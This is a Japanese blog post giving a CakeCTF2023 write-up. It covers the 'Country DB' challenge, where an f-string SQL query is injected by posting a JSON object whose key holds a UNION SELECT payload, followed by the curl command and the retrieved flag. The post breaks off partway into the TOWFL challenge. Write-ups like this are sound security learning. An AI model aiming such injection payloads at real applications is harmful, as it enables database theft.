<!doctype html><html lang=ja dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="はじめに 今回、チーム「🍣」のメンバーとして11/11から11/12まで開催されていたCakeCTF2023に参加しました。 記録として、ここにWriteUp（と期間中に解けなかった問題）を残します。
web Country DB [web, warmup] 問題サイトにアクセスしてみます。 二文字の国名コードを入力すると、その国がどこなのか調べてくれるサイトのようです。 このサイトを構築しているソースファイル群は以下のようになっています。
1 2 3 4 5 6 7 8  . ├── app.py ├── docker-compose.yml ├── Dockerfile ├── init_db.py ├── templates │ └── index.html └── uwsgi.ini   app.pyを見てみます。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!"><title>CakeCTF2023 WriteUp</title>
<link rel=canonical href=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/>
<link rel=stylesheet href=https://hiro-1219.github.io/blog/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css><meta property="og:title" content="CakeCTF2023 WriteUp">
<meta property="og:description" content="はじめに 今回、チーム「🍣」のメンバーとして11/11から11/12まで開催されていたCakeCTF2023に参加しました。 記録として、ここにWriteUp（と期間中に解けなかった問題）を残します。
web Country DB [web, warmup] 問題サイトにアクセスしてみます。 二文字の国名コードを入力すると、その国がどこなのか調べてくれるサイトのようです。 このサイトを構築しているソースファイル群は以下のようになっています。
1 2 3 4 5 6 7 8  . ├── app.py ├── docker-compose.yml ├── Dockerfile ├── init_db.py ├── templates │ └── index.html └── uwsgi.ini   app.pyを見てみます。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!">
<meta property="og:url" content="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/">
<meta property="og:site_name" content="やじるしのブログ">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:published_time" content="2023-11-13T00:00:00+09:00"><meta property="article:modified_time" content="2023-11-13T00:00:00+09:00">
<meta name=twitter:title content="CakeCTF2023 WriteUp">
<meta name=twitter:description content="はじめに 今回、チーム「🍣」のメンバーとして11/11から11/12まで開催されていたCakeCTF2023に参加しました。 記録として、ここにWriteUp（と期間中に解けなかった問題）を残します。
web Country DB [web, warmup] 問題サイトにアクセスしてみます。 二文字の国名コードを入力すると、その国がどこなのか調べてくれるサイトのようです。 このサイトを構築しているソースファイル群は以下のようになっています。
1 2 3 4 5 6 7 8  . ├── app.py ├── docker-compose.yml ├── Dockerfile ├── init_db.py ├── templates │ └── index.html └── uwsgi.ini   app.pyを見てみます。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #!"><style>:root{--ja-font-family:"游ゴシック体", "Yu Gothic", YuGothic, "ヒラギノ角ゴ Pro", "Hiragino Kaku Gothic Pro", "メイリオ", "Meiryo";--base-font-family:"Lato", var(--sys-font-family), var(--ja-font-family), sans-serif;--article-font-size:10pt}</style>
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-JK7NDVM4ZK')</script>
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=メニューを開く・閉じる>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=https://hiro-1219.github.io/blog/>
<img src=https://hiro-1219.github.io/blog/img/avatar_hu2d1b87cef19df202ae4a3cd347a16f08_38532_300x0_resize_box_3.png width=300 height=304 class=site-logo loading=lazy alt=Avatar>
</a>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=https://hiro-1219.github.io/blog/>やじるしのブログ</a></h1>
<h2 class=site-description>いろいろかきます</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/hiro-1219 target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
<li>
<a href=https://twitter.com/Yajirushi_314 target=_blank title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=https://hiro-1219.github.io/blog/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span>
</a>
</li>
<li>
<a href=https://hiro-1219.github.io/blog/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span>
</a>
</li>
<li>
<a href=https://hiro-1219.github.io/blog/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span>
</a>
</li>
<div class=menu-bottom-section>
<li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://hiro-1219.github.io/blog/ selected>日本語</option><option value=https://hiro-1219.github.io/blog/en/>English</option></select>
</li>
<li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>ダークモード</span>
</li>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=https://hiro-1219.github.io/blog/categories/ctf/>
CTF
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/>CakeCTF2023 WriteUp</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Nov 13, 2023</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
読了時間: 15分
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h3 id=はじめに>はじめに</h3>
<p>今回、チーム「🍣」のメンバーとして11/11から11/12まで開催されていたCakeCTF2023に参加しました。
記録として、ここにWriteUp（と期間中に解けなかった問題）を残します。</p>
<h2 id=web>web</h2>
<h3 id=country-db-web-warmup>Country DB [web, warmup]</h3>
<p>問題サイトにアクセスしてみます。
二文字の国名コードを入力すると、その国がどこなのか調べてくれるサイトのようです。
このサイトを構築しているソースファイル群は以下のようになっています。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>.
├── app.py
├── docker-compose.yml
├── Dockerfile
├── init_db.py
├── templates
│   └── index.html
└── uwsgi.ini
</code></pre></td></tr></table>
</div>
</div><p><code>app.py</code>を見てみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=ch>#!/usr/bin/env python3</span>
<span class=kn>import</span> <span class=nn>flask</span>
<span class=kn>import</span> <span class=nn>sqlite3</span>

<span class=n>app</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>

<span class=k>def</span> <span class=nf>db_search</span><span class=p>(</span><span class=n>code</span><span class=p>):</span>
    <span class=k>with</span> <span class=n>sqlite3</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=s1>&#39;database.db&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>conn</span><span class=p>:</span>
        <span class=n>cur</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>cursor</span><span class=p>()</span>
        <span class=n>cur</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SELECT name FROM country WHERE code=UPPER(&#39;</span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span> <span class=c1># SQL injection</span>
        <span class=n>found</span> <span class=o>=</span> <span class=n>cur</span><span class=o>.</span><span class=n>fetchone</span><span class=p>()</span>
    <span class=k>return</span> <span class=kc>None</span> <span class=k>if</span> <span class=n>found</span> <span class=ow>is</span> <span class=kc>None</span> <span class=k>else</span> <span class=n>found</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>

<span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
<span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
    <span class=k>return</span> <span class=n>flask</span><span class=o>.</span><span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>

<span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/api/search&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_search</span><span class=p>():</span>
    <span class=n>req</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span>
    <span class=k>if</span> <span class=s1>&#39;code&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>req</span><span class=p>:</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=s2>&#34;Empty country code&#34;</span><span class=p>)</span>

    <span class=n>code</span> <span class=o>=</span> <span class=n>req</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span>
    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>code</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span> <span class=ow>or</span> <span class=s2>&#34;&#39;&#34;</span> <span class=ow>in</span> <span class=n>code</span><span class=p>:</span> <span class=c1># objectをうまいこと使えばできるのでは</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>400</span><span class=p>,</span> <span class=s2>&#34;Invalid country code&#34;</span><span class=p>)</span>

    <span class=n>name</span> <span class=o>=</span> <span class=n>db_search</span><span class=p>(</span><span class=n>code</span><span class=p>)</span>
    <span class=k>if</span> <span class=n>name</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
        <span class=n>flask</span><span class=o>.</span><span class=n>abort</span><span class=p>(</span><span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;No such country&#34;</span><span class=p>)</span>

    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;name&#39;</span><span class=p>:</span> <span class=n>name</span><span class=p>}</span>

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</code></pre></td></tr></table>
</div>
</div><p>国名コード<code>code</code>から国名を探すエンドポイントは<code>POST /api/search</code>のようです。
ここで、呼び出されている<code>db_search</code>にはSQLによるデータベースの問い合わせの部分にSQL injectionができる箇所があることが分かります。(コメントで記した部分)</p>
<p><code>init_db.py</code>も確認します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=kn>import</span> <span class=nn>sqlite3</span>
<span class=kn>import</span> <span class=nn>os</span>

<span class=n>FLAG</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>,</span> <span class=s2>&#34;FakeCTF{*** REDACTED ***}&#34;</span><span class=p>)</span>

<span class=n>conn</span> <span class=o>=</span> <span class=n>sqlite3</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=s2>&#34;database.db&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;CREATE TABLE country (
</span><span class=s2>  code TEXT NOT NULL,
</span><span class=s2>  name TEXT NOT NULL
</span><span class=s2>);&#34;&#34;&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;CREATE TABLE flag (
</span><span class=s2>  flag TEXT NOT NULL
</span><span class=s2>);&#34;&#34;&#34;</span><span class=p>)</span>
<span class=n>conn</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;INSERT INTO flag VALUES (?)&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>FLAG</span><span class=p>,))</span>

<span class=c1># Country list from https://gist.github.com/vxnick/380904</span>
<span class=n>countries</span> <span class=o>=</span> <span class=p>[</span>
    <span class=p>(</span><span class=s1>&#39;AF&#39;</span><span class=p>,</span> <span class=s1>&#39;Afghanistan&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AX&#39;</span><span class=p>,</span> <span class=s1>&#39;Aland Islands&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AL&#39;</span><span class=p>,</span> <span class=s1>&#39;Albania&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;DZ&#39;</span><span class=p>,</span> <span class=s1>&#39;Algeria&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;AS&#39;</span><span class=p>,</span> <span class=s1>&#39;American Samoa&#39;</span><span class=p>),</span>
<span class=o>...</span>
    <span class=p>(</span><span class=s1>&#39;WF&#39;</span><span class=p>,</span> <span class=s1>&#39;Wallis And Futuna&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;EH&#39;</span><span class=p>,</span> <span class=s1>&#39;Western Sahara&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;YE&#39;</span><span class=p>,</span> <span class=s1>&#39;Yemen&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;ZM&#39;</span><span class=p>,</span> <span class=s1>&#39;Zambia&#39;</span><span class=p>),</span>
    <span class=p>(</span><span class=s1>&#39;ZW&#39;</span><span class=p>,</span> <span class=s1>&#39;Zimbabwe&#39;</span><span class=p>),</span>
<span class=p>]</span>
<span class=n>conn</span><span class=o>.</span><span class=n>executemany</span><span class=p>(</span><span class=s2>&#34;INSERT INTO country VALUES (?, ?)&#34;</span><span class=p>,</span> <span class=n>countries</span><span class=p>)</span>

<span class=n>conn</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
<span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</code></pre></td></tr></table>
</div>
</div><p>データベースにはcountryデータベースのほかに、flagデータベースがあります。
ここに問い合わせてflagカラムを表示するようなSQL文を作るようなSQL injectionが行えればよいです。
しかし、これを行うための問題点がいくつかあります。</p>
<ol>
<li>ブラウザからフォームを使用して<code>code</code>を送信する場合、2文字までしか入力できない(<code>./template/index.html</code>参照)</li>
<li>POSTにより受け取った<code>code</code>の長さが2文字もしくは<code>"'"</code>を含んではいけない(<code>app.py</code> 24~26行目)</li>
</ol>
<p>問題点1はcurlなどを用いて外部から<code>/api/search</code>へPOSTリクエストを送ることで解決できます。
問題点2を解決するために、pythonのformat stringの特性を利用します。
pythonのリストや辞書などのオブジェクトをformat stringを用いて文字列に埋め込むと、次のようにリストや辞書の中身が展開された状態で文字列に埋め込まれます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=o>&gt;&gt;&gt;</span> <span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s2>&#34;b&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
<span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;code = </span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
<span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;a&#39;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s1>&#39;b&#39;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>また、pythonの<code>len()</code>メソッドはリスト、辞書の長さを求めるため、どれだけ長い文字列を入力したとしても、<code>code</code>の長さを自分で調節することが可能になります。（上の場合、キーの文字列の長さをどれだけ長くしたとしても、<code>len(a)</code>は2のままです）
この特性をうまく使って次のようなSQL文を作りたいです。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>SELECT</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>country</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>code</span><span class=o>=</span><span class=k>UPPER</span><span class=p>(</span><span class=s1>&#39;...&#39;</span><span class=p>)</span><span class=w> </span><span class=k>UNION</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>flag</span><span class=p>;</span><span class=w> </span><span class=c1>--
</span></code></pre></td></tr></table>
</div>
</div><p>そこで、<code>/api/search</code>に次のデータをPOSTします。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=p>{</span><span class=nt>&#34;code&#34;</span><span class=p>:</span> <span class=p>{</span><span class=nt>&#34;&#39;)UNION SELECT flag FROM flag; --&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=nt>&#34;a&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}}</span>
</code></pre></td></tr></table>
</div>
</div><p>試しにpythonで動かしてみると、次のようになるため、サーバー上ではflagについても問い合わせるようなSQL文として解釈されるはずです。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=o>&gt;&gt;&gt;</span> <span class=n>code</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;&#39;)UNION SELECT flag FROM flag; --&#34;</span><span class=p>:</span> <span class=mi>10</span><span class=p>,</span> <span class=s2>&#34;a&#34;</span><span class=p>:</span> <span class=mi>20</span><span class=p>}</span>
<span class=o>&gt;&gt;&gt;</span> <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SELECT name FROM country WHERE code=UPPER(&#39;</span><span class=si>{</span><span class=n>code</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=p>)</span>
<span class=n>SELECT</span> <span class=n>name</span> <span class=n>FROM</span> <span class=n>country</span> <span class=n>WHERE</span> <span class=n>code</span><span class=o>=</span><span class=n>UPPER</span><span class=p>(</span><span class=s1>&#39;{&#34;&#39;</span><span class=p>)</span><span class=n>UNION</span> <span class=n>SELECT</span> <span class=n>flag</span> <span class=n>FROM</span> <span class=n>flag</span><span class=p>;</span> <span class=o>--</span><span class=s2>&#34;: 10, &#39;a&#39;: 20}&#39;)</span>
</code></pre></td></tr></table>
</div>
</div><p>これをcurlで<code>/api/search</code>にPOSTするとflagが得られました。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>vagrant@vagrant:~/repo/cakectf2023/web/towfl/service$ curl -X POST -H &#34;Content-Type: application/json&#34; -d &#34;{\&#34;code\&#34;: {\&#34;&#39;)UNION SELECT flag FROM flag; --\&#34;: 10, \&#34;a\&#34;: 20}}&#34; http://countrydb.2023.cakectf.com:8020/api/search
{&#34;name&#34;:&#34;CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}&#34;}
</code></pre></td></tr></table>
</div>
</div><p>よってflagは<code>CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}</code>です。</p>
<h3 id=towfl-cheat-web>TOWFL [cheat, web]</h3>
<p>開催期間中に解けなかった問題です。</p>
<p>問題サイトにアクセスしStart Examを押すと、狼語(？)のまるでTOEFL(もしくはTOEIC)かのような4択問題が10*10問出題されます。これで100点（1問1点）が取れればflagが得られるようです。
サイトを構築しているソースファイル群は以下のようになっています。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>.
├── docker-compose.yml
├── redis
│   ├── Dockerfile
│   └── redis.conf
└── service
    ├── app.py
    ├── Dockerfile
    ├── static
    │   ├── fonts
    │   │   └── hymmnos.ttf
    │   ├── img
    │   │   └── towfl.webp
    │   └── js
    │       └── script.js
    ├── templates
    │   └── index.html
    └── uwsgi.ini
</code></pre></td></tr></table>
</div>
</div><p><code>app.py</code>を確認すると、4つのエンドポイントがあることが分かります。</p>
<ul>
<li>POST <code>/api/start</code></li>
<li>GET <code>/api/question/&lt;int:qid></code></li>
<li>POST <code>/api/submit</code></li>
<li>GET <code>/api/score</code></li>
</ul>
<p>それぞれ次のようになっていました。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/start&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
